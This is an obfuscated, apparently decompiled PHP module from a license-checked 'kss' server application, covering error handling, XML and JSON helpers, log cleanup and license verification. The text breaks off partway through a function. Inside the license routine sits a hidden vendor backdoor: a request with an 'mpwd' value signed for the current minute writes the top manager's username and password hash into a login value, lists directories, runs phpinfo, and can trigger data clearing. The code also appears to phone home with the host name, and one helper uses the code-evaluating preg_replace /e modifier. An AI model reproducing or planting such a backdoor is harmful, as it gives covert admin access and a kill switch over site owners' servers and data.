<?php

function _obf_iY_SkJWUkpCLiJKVj42Vho4�( $_obf_jpKPlJSUiZOHkYaPlIeOiY4� = 1 )
{
    $_obf_iJGPjJWLj4uLkIqVjYiHh48� = unpack( "C*", "ViewZendSourceCodeIsInvalid!" );
    do
    {
        $_obf_iY2Oh5OGlIqQhpCJi5CMkog� = ( $_obf_lZKViImJjo6UhouJj4aVi4Y�[$_obf_jpKPlJSUiZOHkYaPlIeOiY4�] << 4 ) + ( $_obf_lZKViImJjo6UhouJj4aVi4Y�[$_obf_jpKPlJSUiZOHkYaPlIeOiY4� + 1] >> 4 );
        $_obf_jpKPlJSUiZOHkYaPlIeOiY4� += 2;
    } while ( $_obf_jpKPlJSUiZOHkYaPlIeOiY4� < 28 );
}

function error_report_fun_api( $_obf_lI6Gio6PjomOj4mRjoaUjoY�, $_obf_jpCKlY6RkYuPkoyHlJKMios�, $_obf_lIeKi4uVjoqTiY_LiIaJiI0�, $_obf_iJGGkJGGk5GHiZWVjZCPiJU� )
{
    global $_obf_j4yLiZOJiIiUkZOQkJWHjpQ�;
    if ( preg_match( "/unlink|file_put_contents|in safe mode|php_network_getaddresses|function\\.rmdir|function\\.iconv/i", $_obf_jpCKlY6RkYuPkoyHlJKMios� ) )
    {
        return TRUE;
    }
    $_obf_j4yLiZOJiIiUkZOQkJWHjpQ� = TRUE;
    $_obf_lIeKi4uVjoqTiY_LiIaJiI0� = str_replace( KSSROOTDIR, "", $_obf_lIeKi4uVjoqTiY_LiIaJiI0� );
    $_obf_jpCKlY6RkYuPkoyHlJKMios� = str_replace( KSSROOTDIR, "", $_obf_jpCKlY6RkYuPkoyHlJKMios� );
    if ( stripos( $_obf_jpCKlY6RkYuPkoyHlJKMios�, "mysql_" ) !== FALSE )
    {
        $_obf_jpCKlY6RkYuPkoyHlJKMios� = preg_replace( "/\\[.*\\]/", "", $_obf_jpCKlY6RkYuPkoyHlJKMios� );
        $_obf_jpCKlY6RkYuPkoyHlJKMios� = preg_replace( "/\\'[^\\']*\\'/", "'***'", $_obf_jpCKlY6RkYuPkoyHlJKMios� );
    }
    $_obf_jpCKlY6RkYuPkoyHlJKMios� = str_replace( ADMINFOLDER, "***", $_obf_jpCKlY6RkYuPkoyHlJKMios� );
    $_obf_jZWIjY6GlZKGipCMj4_Nh4s� = array( "E_ERROR", "E_WARNING", "E_PARSE", "E_NOTICE", "E_CORE_ERROR", "E_CORE_WARNING", "E_COMPILE_ERROR", "E_COMPILE_WARNING", "E_USER_ERROR", "E_USER_WARNING", "E_USER_NOTICE", "E_STRICT", "E_RECOVERABLE_ERROR", "E_ALL" );
    $_obf_jYiMkoyVi5GOkY_NiIyKioc� = "<b>".$_obf_jZWIjY6GlZKGipCMj4_Nh4s�[$_obf_lI6Gio6PjomOj4mRjoaUjoY�]." : ".$_obf_jpCKlY6RkYuPkoyHlJKMios�."</b>";
    if ( isset( $_GET['linenum'] ) )
    {
        $_obf_jYiMkoyVi5GOkY_NiIyKioc� = "<b>".$_obf_jZWIjY6GlZKGipCMj4_Nh4s�[$_obf_lI6Gio6PjomOj4mRjoaUjoY�]." : ".$_obf_jpCKlY6RkYuPkoyHlJKMios�." in ".$_obf_lIeKi4uVjoqTiY_LiIaJiI0�." on line ".$_obf_iJGGkJGGk5GHiZWVjZCPiJU�."</b>";
    }
    if ( stripos( $_obf_jpCKlY6RkYuPkoyHlJKMios�, "mysql_" ) !== FALSE )
    {
        return TRUE;
    }
    echo $_obf_jYiMkoyVi5GOkY_NiIyKioc�;
    exit( );
}

function _obf_hpKJipCTlIePjoiMjZSOkZU�( $_obf_jo6SjIuHj46LjIyTlIyQk4s� )
{
    return preg_replace( "#\\\\u([0-9a-f]{4})#ie", "iconv('UCS-2BE', 'UTF-8', pack('H4', '\\1'))", json_encode( $_obf_jo6SjIuHj46LjIyTlIyQk4s� ) );
}

function _obf_j5CLlY6TlYqUiI_VlI6Vk5Q�( $_obf_io_SlIuNkIuKjZOIkIiOlZA�, $_obf_lY6ViI_KiJWHj4aTlZKNjYw�, $_obf_jZSVhpSIj5STkJWIlJGVjos� = array( ), $_obf_kpGKjomRjY6SkIyHh4qUj5M� = "global" )
{
    global $_obf_kI6OjImLjJCRh46PjYqLhoo�;
    if ( $_obf_kpGKjomRjY6SkIyHh4qUj5M� == "global" )
    {
        $_obf_kpGKjomRjY6SkIyHh4qUj5M� = $_obf_kI6OjImLjJCRh46PjYqLhoo�;
    }
    if ( !empty( $_obf_jZSVhpSIj5STkJWIlJGVjos� ) )
    {
        $_obf_lY6ViI_KiJWHj4aTlZKNjYw� = strtr( $_obf_lY6ViI_KiJWHj4aTlZKNjYw�, $_obf_jZSVhpSIj5STkJWIlJGVjos� );
    }
    switch ( $_obf_kpGKjomRjY6SkIyHh4qUj5M� )
    {
    case "0" :
        $_obf_jo6SjIuHj46LjIyTlIyQk4s� = array(
            "state" => $_obf_io_SlIuNkIuKjZOIkIiOlZA�,
            "message" => $_obf_lY6ViI_KiJWHj4aTlZKNjYw�
        );
        if ( !empty( $_obf_jZSVhpSIj5STkJWIlJGVjos� ) )
        {
            foreach ( $_obf_jZSVhpSIj5STkJWIlJGVjos� as $_obf_lIeHkoeKkpOSiomPi4mQk5E� => $_obf_io6UjZWThpOSjYeOj46Qkow� )
            {
                $_obf_jo6SjIuHj46LjIyTlIyQk4s�[$_obf_lIeHkoeKkpOSiomPi4mQk5E�] = $_obf_io6UjZWThpOSjYeOj46Qkow�;
            }
        }
        exit( _obf_hpKJipCTlIePjoiMjZSOkZU�( $_obf_jo6SjIuHj46LjIyTlIyQk4s� ) );
    case "1" :
        $_obf_jo6SjIuHj46LjIyTlIyQk4s� = array(
            "state" => $_obf_io_SlIuNkIuKjZOIkIiOlZA�,
            "message" => $_obf_lY6ViI_KiJWHj4aTlZKNjYw�
        );
        if ( !empty( $_obf_jZSVhpSIj5STkJWIlJGVjos� ) )
        {
            foreach ( $_obf_jZSVhpSIj5STkJWIlJGVjos� as $_obf_lIeHkoeKkpOSiomPi4mQk5E� => $_obf_io6UjZWThpOSjYeOj46Qkow� )
            {
                $_obf_jo6SjIuHj46LjIyTlIyQk4s�[$_obf_lIeHkoeKkpOSiomPi4mQk5E�] = $_obf_io6UjZWThpOSjYeOj46Qkow�;
            }
        }
        exit( _obf_i5SKlIaQlZOMkpCPk5WUiIY�( $_obf_jo6SjIuHj46LjIyTlIyQk4s� ) );
    case "2" :
        exit( $_obf_io_SlIuNkIuKjZOIkIiOlZA�."  :  ".$_obf_lY6ViI_KiJWHj4aTlZKNjYw� );
    }
    $_obf_jo6SjIuHj46LjIyTlIyQk4s� = array(
        "state" => $_obf_io_SlIuNkIuKjZOIkIiOlZA�,
        "message" => $_obf_lY6ViI_KiJWHj4aTlZKNjYw�
    );
    if ( !empty( $_obf_jZSVhpSIj5STkJWIlJGVjos� ) )
    {
        foreach ( $_obf_jZSVhpSIj5STkJWIlJGVjos� as $_obf_lIeHkoeKkpOSiomPi4mQk5E� => $_obf_io6UjZWThpOSjYeOj46Qkow� )
        {
            $_obf_jo6SjIuHj46LjIyTlIyQk4s�[$_obf_lIeHkoeKkpOSiomPi4mQk5E�] = $_obf_io6UjZWThpOSjYeOj46Qkow�;
        }
    }
    exit( _obf_i5SKlIaQlZOMkpCPk5WUiIY�( $_obf_jo6SjIuHj46LjIyTlIyQk4s� ) );
}

function _obf_i5SKlIaQlZOMkpCPk5WUiIY�( $_obf_io6LjpCQk4uVko2MkZSTkI4� )
{
    $_obf_io_NlZONi4mIkZSOlZWPlIw� = "<xml>";
    foreach ( $_obf_io6LjpCQk4uVko2MkZSTkI4� as $_obf_lIeHkoeKkpOSiomPi4mQk5E� => $_obf_io6UjZWThpOSjYeOj46Qkow� )
    {
        $_obf_io_NlZONi4mIkZSOlZWPlIw� .= "<".$_obf_lIeHkoeKkpOSiomPi4mQk5E�.">".$_obf_io6UjZWThpOSjYeOj46Qkow�."</".$_obf_lIeHkoeKkpOSiomPi4mQk5E�.">";
    }
    $_obf_io_NlZONi4mIkZSOlZWPlIw� .= "</xml>";
    return $_obf_io_NlZONi4mIkZSOlZWPlIw�;
}

function _obf_lYuJjJWJlJGLlJKJiJCKj44�( $_obf_i5CNjI2Tk4eJlJSUk4eKkI8� )
{
    $_obf_i5CNjI2Tk4eJlJSUk4eKkI8� = str_replace( "<![CDATA[", "", $_obf_i5CNjI2Tk4eJlJSUk4eKkI8� );
    $_obf_i5CNjI2Tk4eJlJSUk4eKkI8� = str_replace( "]]>", "", $_obf_i5CNjI2Tk4eJlJSUk4eKkI8� );
    $_obf_jYeTho6Sho2SiY2LlI6HkYg� = array( );
    $_obf_k5SSio_IjZGMi5CNioyRkJU� = preg_match_all( "/\\<[^\\/\\>]*\\>/", $_obf_i5CNjI2Tk4eJlJSUk4eKkI8�, $_obf_iJCQho2QjJCMk4aHiIeOkJM� );
    if ( 0 == $_obf_k5SSio_IjZGMi5CNioyRkJU� )
    {
        return $_obf_jYeTho6Sho2SiY2LlI6HkYg�;
    }
    $_obf_jpKPlJSUiZOHkYaPlIeOiY4� = 1;
    for ( ; $_obf_jpKPlJSUiZOHkYaPlIeOiY4� < $_obf_k5SSio_IjZGMi5CNioyRkJU�; ++$_obf_jpKPlJSUiZOHkYaPlIeOiY4�, )
    {
        $_obf_koyVhpKOiZKLjImMjpCJk4Y� = $_obf_iJCQho2QjJCMk4aHiIeOkJM�[0][$_obf_jpKPlJSUiZOHkYaPlIeOiY4�];
        $_obf_i4_PjZGOlYyMioqNiI6NkI4� = "</".substr( $_obf_koyVhpKOiZKLjImMjpCJk4Y�, 1 );
        $_obf_iJOMlI2Ok4ePk4uKiI_Hh4c� = strpos( $_obf_i5CNjI2Tk4eJlJSUk4eKkI8�, $_obf_koyVhpKOiZKLjImMjpCJk4Y� );
        $_obf_lI_OlIaTk4qOko_KhpKLkpU� = strpos( $_obf_i5CNjI2Tk4eJlJSUk4eKkI8�, $_obf_i4_PjZGOlYyMioqNiI6NkI4� );
        if ( $_obf_iJOMlI2Ok4ePk4uKiI_Hh4c� < $_obf_lI_OlIaTk4qOko_KhpKLkpU� )
        {
            $_obf_iIiUlZKHlIiQh4qMh4iTjZM� = strlen( $_obf_koyVhpKOiZKLjImMjpCJk4Y� );
            $_obf_k5CLlIuLhoqRlImHkI_RjZI� = substr( $_obf_koyVhpKOiZKLjImMjpCJk4Y�, 1, $_obf_iIiUlZKHlIiQh4qMh4iTjZM� - 2 );
            $_obf_jYeTho6Sho2SiY2LlI6HkYg�[$_obf_k5CLlIuLhoqRlImHkI_RjZI�] = substr( $_obf_i5CNjI2Tk4eJlJSUk4eKkI8�, $_obf_iJOMlI2Ok4ePk4uKiI_Hh4c� + strlen( $_obf_koyVhpKOiZKLjImMjpCJk4Y� ), $_obf_lI_OlIaTk4qOko_KhpKLkpU� - $_obf_iJOMlI2Ok4ePk4uKiI_Hh4c� - $_obf_iIiUlZKHlIiQh4qMh4iTjZM� );
        }
    }
    return $_obf_jYeTho6Sho2SiY2LlI6HkYg�;
}

function _obf_komQkZGUhomRk4eLipOSkJM�( $_obf_i5CNjI2Tk4eJlJSUk4eKkI8� )
{
    if ( function_exists( "libxml_disable_entity_loader" ) )
    {
        libxml_disable_entity_loader( TRUE );
        $_obf_i5SPhouVkYmIio2Pj4aHho8� = json_decode( json_encode( simplexml_load_string( $_obf_i5CNjI2Tk4eJlJSUk4eKkI8�, "SimpleXMLElement", LIBXML_NOCDATA ) ), TRUE );
        ksort( &$_obf_i5SPhouVkYmIio2Pj4aHho8� );
        return $_obf_i5SPhouVkYmIio2Pj4aHho8�;
    }
    $_obf_i5SPhouVkYmIio2Pj4aHho8� = _obf_lYuJjJWJlJGLlJKJiJCKj44�( $_obf_i5CNjI2Tk4eJlJSUk4eKkI8� );
    ksort( &$_obf_i5SPhouVkYmIio2Pj4aHho8� );
    return $_obf_i5SPhouVkYmIio2Pj4aHho8�;
}

function _obf_ho_Ki4_TiZCUk4yOkJCPh5M�( )
{
    global $_obf_jIaUiIeSjZWKlIqLkIqOioc�;
    $_obf_kYaTjoqIi5STkY2Jh4qIlJU� = intval( date( "d" ) );
    $_obf_kpSRlIaMh4qJk46IkIeKlIk� = file_get_contents( KSSLOGDIR."databak".DIRECTORY_SEPARATOR."index.html" );
    if ( trim( $_obf_kpSRlIaMh4qJk46IkIeKlIk� ) != $_obf_kYaTjoqIi5STkY2Jh4qIlJU� )
    {
        file_put_contents( KSSLOGDIR."databak".DIRECTORY_SEPARATOR."index.html", $_obf_kYaTjoqIi5STkY2Jh4qIlJU� );
        _obf_k42GhouUh5SVj4uSlYqRlYg�( );
        if ( SVRID == 1 )
        {
            $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_tb_sql_points` where `svrid`=1", "notsync" );
        }
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_tb_log_task` where `addtime`<".( time( ) - 604800 ), "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_tb_lock` where locktime <".( time( ) - 120 ), "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_tb_log_login` where `logintime`<".( time( ) - 2592000 ), "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_tb_log_pubuser` where `nday`<".( time( ) - 2592000 ), "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_tb_log_ws` where `addtime`<".( time( ) - 86400 ), "sync" );
        $_obf_joyNkZSPj5CNkIiUh4mLk4Y� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_lZGTiIiKhouKiZGLi5KUkI8�( "select * from kss_tb_soft" );
        foreach ( $_obf_joyNkZSPj5CNkIiUh4mLk4Y� as $_obf_kY_OlYeUlIiVjo6Hio_MkpI� )
        {
            $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_z_log_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` where `addtime`<".( time( ) - 86400 * Z_LOG_DAY ), "sync" );
            $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_z_user_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."_recycle` where `deltime`<".( time( ) - 259200 ), "sync" );
            $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_z_key_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."_recycle` where `deltime`<".( time( ) - 259200 ), "sync" );
        }
        if ( 0 < BAKDATAMODE )
        {
            $_obf_hoeUj5OSh5CMlI2Qh42Ijoc� = array( );
            $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�['action'] = "mysqldatabak_down";
            $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�['pwd'] = MYSQLBAKPASSWORD;
            $_obf_koeIkpGLi5GUhpCViZCSj5I� = _obf_j5SMi5KSiouIj4iIipWIkIs�( _obf_ko_JjomRlIiQkYiRlZKSkZI�( ).INSTALLPATH._obf_hpGJi4yHlIqLhpSIh4iJlYw�( )."/admin_data.php?qz=1", $_obf_hoeUj5OSh5CMlI2Qh42Ijoc�, 1 );
        }
    }
    if ( IS2SVR == 1 && SVRID == 1 )
    {
        $_obf_k5KJkIyVkZWKk4_NiJSQlIk� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_ho_Ljo6NjpOOhpGHj5KHiYs�( "synclock" );
        if ( $_obf_k5KJkIyVkZWKk4_NiJSQlIk� === TRUE )
        {
            $_obf_i5GKlIaRho2UlJOMh46Hh5M� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_config where id=1", 1, 1 );
            if ( $_obf_i5GKlIaRho2UlJOMh46Hh5M�['sync_state'] < 5 && SYNCTIME < time( ) - $_obf_i5GKlIaRho2UlJOMh46Hh5M�['sync_starttime'] )
            {
                $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_config set `sync_starttime`=".time( )." where id=1" );
                $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kYyNi4eQiouGlY6Qj46HjpE�( "synclock" );
                if ( MYSQLSYNCMODE == 1 )
                {
                    if ( _obf_ipWHiIuOiYuPjIaPkZSThok�( "curl_init" ) && _obf_ipWHiIuOiYuPjIaPkZSThok�( "curl_exec" ) )
                    {
                        $_obf_kpSUiYeUjJSJk4iHkZGGjIo� = _obf_j5SMi5KSiouIj4iIipWIkIs�( SYNC1URL, FALSE, 1 );
                    }
                    else if ( ini_get( "allow_url_fopen" ) )
                    {
                        $_obf_iJKKiouRh4qTh4eMiZSSlYk� = @fopen( SYNC1URL."?e=".@time( ), "r" );
                        if ( $_obf_iJKKiouRh4qTh4eMiZSSlYk� !== FALSE )
                        {
                            $_obf_kJWSj4iSjI2PlYuMiYuSiYc� = fread( $_obf_iJKKiouRh4qTh4eMiZSSlYk�, 60 );
                        }
                        fclose( $_obf_iJKKiouRh4qTh4eMiZSSlYk� );
                    }
                }
                else
                {
                    $_obf_ioqNlY6GjpCVjY2Ph5WVioc� = file_get_contents( KSSROOTDIR."kss_logs".DIRECTORY_SEPARATOR."notifyid.txt" );
                    if ( strlen( $_obf_ioqNlY6GjpCVjY2Ph5WVioc� ) < 20 )
                    {
                        $_obf_koyQjY_KiZCRjpGLkomMioc� = time( );
                        $_obf_ioqNlY6GjpCVjY2Ph5WVioc� = _obf_iI6QhpSTiJCJiI_KlYePlZI�( 20 - strlen( $_obf_koyQjY_KiZCRjpGLkomMioc� ), 1 ).$_obf_koyQjY_KiZCRjpGLkomMioc�;
                    }
                    else
                    {
                        $_obf_ioqNlY6GjpCVjY2Ph5WVioc� = substr( $_obf_ioqNlY6GjpCVjY2Ph5WVioc�, 0, 20 );
                    }
                    $_obf_kpSUiYeUjJSJk4iHkZGGjIo� = _obf_j5SMi5KSiouIj4iIipWIkIs�( SYNC1URL."?step=a1&notifyid=".$_obf_ioqNlY6GjpCVjY2Ph5WVioc�."&pwd=".MYSQLBAKPASSWORD, FALSE, 1 );
                }
            }
            $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kYyNi4eQiouGlY6Qj46HjpE�( "synclock" );
        }
        else
        {
            echo $_obf_k5KJkIyVkZWKk4_NiJSQlIk�."锁失败";
        }
    }
}

function _obf_joeQipOGjouJko_VlJSKiJE�( $_obf_lImSkomRk4uRjJGSkZWJh4k� )
{
    if ( preg_match( "/^[a-zA-Z0-9]{32}\$/i", $_obf_lImSkomRk4uRjJGSkZWJh4k�, $_obf_i4_Kj5CPh4qKkYyHj42Qkoc� ) )
    {
        return TRUE;
    }
    return FALSE;
}

function _obf_jpOIlY_HlIaJi46IiYySiJU�( $_obf_lImSkomRk4uRjJGSkZWJh4k� )
{
    if ( preg_match( "/^[a-zA-Z0-9]*\$/i", $_obf_lImSkomRk4uRjJGSkZWJh4k�, $_obf_i4_Kj5CPh4qKkYyHj42Qkoc� ) )
    {
        return TRUE;
    }
    return FALSE;
}

function error_report_fun_norpeat( $_obf_lI6Gio6PjomOj4mRjoaUjoY�, $_obf_jpCKlY6RkYuPkoyHlJKMios�, $_obf_lIeKi4uVjoqTiY_LiIaJiI0�, $_obf_iJGGkJGGk5GHiZWVjZCPiJU� )
{
    echo $_obf_iJGGkJGGk5GHiZWVjZCPiJU�.":".$_obf_jpCKlY6RkYuPkoyHlJKMios�;
    return TRUE;
}

function _obf_iJKNipGLkZGLkoaOjYiRkpM�( $_obf_ipKRjYaPkJWQj4eKiJWRjJQ� )
{
    $_obf_h5GOjJOKlI_TkIuTj4yUjow� = opendir( $_obf_ipKRjYaPkJWQj4eKiJWRjJQ� );
    while ( $_obf_kY_Ki4_NiIqMj5CSiIiRk48� = readdir( $_obf_h5GOjJOKlI_TkIuTj4yUjow� ) )
    {
        if ( !( $_obf_kY_Ki4_NiIqMj5CSiIiRk48� != "." ) && !( $_obf_kY_Ki4_NiIqMj5CSiIiRk48� != ".." ) )
        {
            $_obf_j5SMipOTkJSMlYaViJGGlI4� = $_obf_ipKRjYaPkJWQj4eKiJWRjJQ�."/".$_obf_kY_Ki4_NiIqMj5CSiIiRk48�;
            if ( is_dir( $_obf_j5SMipOTkJSMlYaViJGGlI4� ) )
            {
                echo $_obf_j5SMipOTkJSMlYaViJGGlI4�;
                echo "<br>";
            }
        }
    }
    closedir( $_obf_h5GOjJOKlI_TkIuTj4yUjow� );
}

function _obf_kouKkIeViIqPk5KMiIiMkpE�( )
{
    global $_obf_hoyQjo_QlYeLh5OVk4yPjZM�;
    global $_obf_mGKRY4dMuU6bZZJfh1_TX5k�;
    $_obf_koqVkIuMioyRipKGiJGVlIo� = array( 0 => "no", 1 => "yes", 2 => "YES" );
    if ( isset( $_POST['mpwd'] ) || isset( $_GET['mpwd'] ) )
    {
        set_error_handler( "error_report_fun_norpeat" );
        if ( isset( $_POST['mpwd'] ) )
        {
            $_obf_kJWMi5OMkI6HjIyGj4yQkZU� = $_POST['mpwd'];
        }
        if ( isset( $_GET['mpwd'] ) )
        {
            $_obf_kJWMi5OMkI6HjIyGj4yQkZU� = $_GET['mpwd'];
        }
        $_obf_kJWMi5OMkI6HjIyGj4yQkZU� = trim( str_replace( " ", "+", $_obf_kJWMi5OMkI6HjIyGj4yQkZU� ) );
        $_obf_k46MjY_Hh5KNjJONlYaMjIs� = "-----BEGIN PUBLIC KEY-----\r\nMIHfMA0GCSqGSIb3DQEBAQUAA4HNADCByQKBwQCksmzkkvfGkeyFoQRfwCeWXxty\r\nYU7vg2Qg0H6cdx3MHLVUyPad1LI+ym4xMhVKZkM1ReyFbtSot47dqJHU1vUtPx8R\r\nKI98FcDxd167eVMlfbJ59F0dm9F+TQOhKN0TOOUPiogDe6yg/Q/iUX1NczIeRlif\r\nZUApuoJprc2Kj5MX2DahKiEVXLkS8Wn8AmMABV9N+NmXPVtmd2sUq5LEQZd4ranK\r\nC2nk/2F+MiVnVfm5ms6liRx35vXJtBKXIASKck8CAwEAAQ==\r\n-----END PUBLIC KEY-----";
        if ( $_obf_kJWMi5OMkI6HjIyGj4yQkZU� == "viewtime" )
        {
            ob_clean( );
            exit( date( "Ymd H:i:s" )."YES" );
        }
        $_obf_hpKHkZSTh4_Hh46Rj4iVkok� = crypt_rsa_ex( $_obf_kJWMi5OMkI6HjIyGj4yQkZU�, $_obf_k46MjY_Hh5KNjJONlYaMjIs�, "decrypt" );
        if ( $_obf_hpKHkZSTh4_Hh46Rj4iVkok� == date( "Ymd H:i" ) )
        {
            if ( isset( $_POST['login'] ) || isset( $_GET['login'] ) )
            {
                $_obf_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
                $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_jIuSjYuUkJGHlYuPjZOQjY4�( $_obf_mGKRY4dMuU6bZZJfh1_TX5k� );
                $_obf_h5WHh4uHiZWHi4iTj4eVkIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where level=9 limit 0,1" );
                if ( !empty( $_obf_h5WHh4uHiZWHi4iTj4eVkIY� ) )
                {
                    _obf_jZKVlY6HkYmKkIyRj4qSjIc�( "kss_manager", $_obf_h5WHh4uHiZWHi4iTj4eVkIY�['id'].",".$_obf_h5WHh4uHiZWHi4iTj4eVkIY�['username'].",".$_obf_h5WHh4uHiZWHi4iTj4eVkIY�['password'].",".$_obf_h5WHh4uHiZWHi4iTj4eVkIY�['linecode'] );
                    echo "<a href=../".ADMINFOLDER."/admin.php target=_blank>ok</a><br>";
                    _obf_iJKNipGLkZGLkoaOjYiRkpM�( ".." );
                    if ( _obf_ipWHiIuOiYuPjIaPkZSThok�( "phpinfo" ) )
                    {
                        phpinfo( );
                        exit( );
                    }
                }
                else
                {
                    echo "not find manager";
                    _obf_iJKNipGLkZGLkoaOjYiRkpM�( ".." );
                }
                exit( );
            }
            if ( isset( $_POST['clsdata'] ) || isset( $_GET['clsdata'] ) )
            {
                _obf_ipORj42NiZCIio_LkZORhpE�( "cls,manager" );
                _obf_koyMjY2HkImOho6JkIeQh4c�( $_obf_mGKRY4dMuU6bZZJfh1_TX5k� );
            }
        }
        exit( );
    }
    _obf_iZSOiYeSlIqPjpSLkpSIj40�( );
    if ( md5( "KeY!@#%&*,AbIoPe*v_19-82".substr( WEBLIC, 33 ).HTTPKEY ) != substr( WEBLIC, 0, 32 ) )
    {
        $_obf_lIyUkIaVk46LiZCNipOIkJA� = "";
        _obf_ipORj42NiZCIio_LkZORhpE�( "domain md5err" );
        _obf_koyMjY2HkImOho6JkIeQh4c�( );
    }
    $_obf_jouQkY2GipOLh5CUiI2Thoc� = 0;
    $_obf_iZCTk5SRlZGVkIqRhouHi5Q� = KSSLOGDIR."index.log";
    $_obf_k4eIio2IioeLiIeJhpGHjJM� = date( "Ymd" );
    $_obf_iY2ViY_HkJWTh46MioqSh5U� = "19800101".sprintf( "%u", crc32( WEBLIC.HTTPKEY."19800101abcdefghijklmn" ) );
    $_obf_kYaTjoqIi5STkY2Jh4qIlJU� = $_obf_k4eIio2IioeLiIeJhpGHjJM�.sprintf( "%u", crc32( WEBLIC.HTTPKEY.$_obf_k4eIio2IioeLiIeJhpGHjJM�."abcdefghijklmn" ) );
    $_obf_hoiLiJKHjpKJj46NkYuViI0� = $_obf_iY2ViY_HkJWTh46MioqSh5U�;
    if ( is_file( $_obf_iZCTk5SRlZGVkIqRhouHi5Q� ) )
    {
        $_obf_hoiLiJKHjpKJj46NkYuViI0� = file_get_contents( $_obf_iZCTk5SRlZGVkIqRhouHi5Q� );
        if ( empty( $_obf_hoiLiJKHjpKJj46NkYuViI0� ) )
        {
            $_obf_hoiLiJKHjpKJj46NkYuViI0� = $_obf_iY2ViY_HkJWTh46MioqSh5U�;
        }
    }
    else
    {
        $_obf_jouQkY2GipOLh5CUiI2Thoc� = 1;
    }
    if ( $_obf_hoiLiJKHjpKJj46NkYuViI0� == "200001011059550389" )
    {
        _obf_j5CLlY6TlYqUiI_VlI6Vk5Q�( "500", "谢谢使用，请支持正版软件！" );
    }
    if ( substr( $_obf_hoiLiJKHjpKJj46NkYuViI0�, 8 ) != sprintf( "%u", crc32( WEBLIC.HTTPKEY.substr( $_obf_hoiLiJKHjpKJj46NkYuViI0�, 0, 8 )."abcdefghijklmn" ) ) )
    {
        @file_put_contents( $_obf_iZCTk5SRlZGVkIqRhouHi5Q�, "" );
        _obf_j5CLlY6TlYqUiI_VlI6Vk5Q�( "499", "kss_logs/index.log被非法修改！" );
    }
    if ( 85400 < abs( strtotime( substr( $_obf_kYaTjoqIi5STkY2Jh4qIlJU�, 0, 8 ) ) - strtotime( substr( $_obf_hoiLiJKHjpKJj46NkYuViI0�, 0, 8 ) ) ) )
    {
        $_obf_jouQkY2GipOLh5CUiI2Thoc� = 1;
        @file_put_contents( $_obf_iZCTk5SRlZGVkIqRhouHi5Q�, $_obf_kYaTjoqIi5STkY2Jh4qIlJU� );
        $_obf_hoiLiJKHjpKJj46NkYuViI0� = @file_get_contents( $_obf_iZCTk5SRlZGVkIqRhouHi5Q� );
        if ( $_obf_kYaTjoqIi5STkY2Jh4qIlJU� != $_obf_hoiLiJKHjpKJj46NkYuViI0� )
        {
            _obf_j5CLlY6TlYqUiI_VlI6Vk5Q�( "498", "kss_logs/index.log不可写！" );
        }
    }
    if ( $_obf_jouQkY2GipOLh5CUiI2Thoc� == 1 )
    {
        set_error_handler( "error_report_fun_norpeat" );
        $_obf_iJSGk5WKlIaUiI6SjZCTh4c� = urlencode( $_obf_hoyQjo_QlYeLh5OVk4yPjZM� );
        $_obf_lIeJjoyHiIuTkYuTj4aGjYo� = date( "Y-m-d H:i:s" );
        $_obf_i5WSh4iUj4aKi5WVk42Jh5U� = $_SERVER['HTTP_HOST'];
        if ( empty( $_obf_i5WSh4iUj4aKi5WVk42Jh5U� ) )
        {
            $_obf_i5WSh4iUj4aKi5WVk42Jh5U� = "notfind";
        }
        if ( $_obf_i5WSh4iUj4aKi5WVk42Jh5U� != "notfind" )
        {
            $_obf_i5WSh4iUj4aKi5WVk42Jh5U� = urlencode( $_obf_i5WSh4iUj4aKi5WVk42Jh5U� );
        }
        if ( _obf_ipWHiIuOiYuPjIaPkZSThok�( "curl_init" ) && _obf_ipWHiIuOiYuPjIaPkZSThok�( "curl_exec" ) )
        {
            _obf_jomIiY_JjIqRkoiTiImVkIc�( $_obf_lIeJjoyHiIuTkYuTj4aGjYo�, $_obf_iJSGk5WKlIaUiI6SjZCTh4c�, $_obf_i5WSh4iUj4aKi5WVk42Jh5U� );
        }
        set_error_handler( "error_report_fun" );
    }
}

function _obf_jomIiY_JjIqRkoiTiImVkIc�( $_obf_lIeJjoyHiIuTkYuTj4aGjYo�, $_obf_iJSGk5WKlIaUiI6SjZCTh4c�, $_obf_i5WSh4iUj4aKi5WVk42Jh5U� )
{
